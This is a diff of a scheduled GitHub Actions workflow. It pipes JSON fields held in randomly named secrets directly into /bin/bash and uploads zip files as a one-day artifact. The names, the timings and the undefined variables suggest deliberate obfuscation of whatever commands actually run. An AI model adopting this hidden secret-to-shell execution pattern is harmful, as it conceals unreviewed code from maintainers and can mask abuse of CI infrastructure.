@@ -1,27 +1,26 @@
 name: jingbaofanmu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '37 3/6 * * *'
-jobs:  # 31442
+    - cron: '6 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jingbaofanmu
         env:
-          t6349: ${{ secrets.t6349 }}
+          yer30594: ${{ secrets.yer30594 }}
         run: |
-          echo $t6349 | jq -r .j8749 | /bin/bash
-          echo $qdl18 | jq -r .crea19 | /bin/bash
-          echo $mkg58088 | jq -r .ll53172 | /bin/bash
-          echo $tc2 | jq -r .kpj17729 | /bin/bash
-          echo $kw3146 | jq -r .s2 | /bin/bash
-          echo $zhu4 | jq -r .qo79425 | /bin/bash
-          echo $frud28 | jq -r .rpl6687 | /bin/bash
-          echo $tyk9156 | jq -r .ock1 | /bin/bash
-          echo $ppmy4 | jq -r .v428 | /bin/bash
-          echo $irt9 | jq -r .w8372 | /bin/bash
-          echo $vg54 | jq -r .ue44583 | /bin/bash
+          printf '%s' "$yer30594" | jq -r .oo06023 | /bin/bash
+          echo $ecwgs583 | jq -r .el7 | /bin/bash
+          printf '%s' "$sair31082" | jq -r .srpgg763 | /bin/bash
+          echo $yaao53 | jq -r .wd35 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9fJppNYh
+          path: "*.zip"
+          retention-days: 1
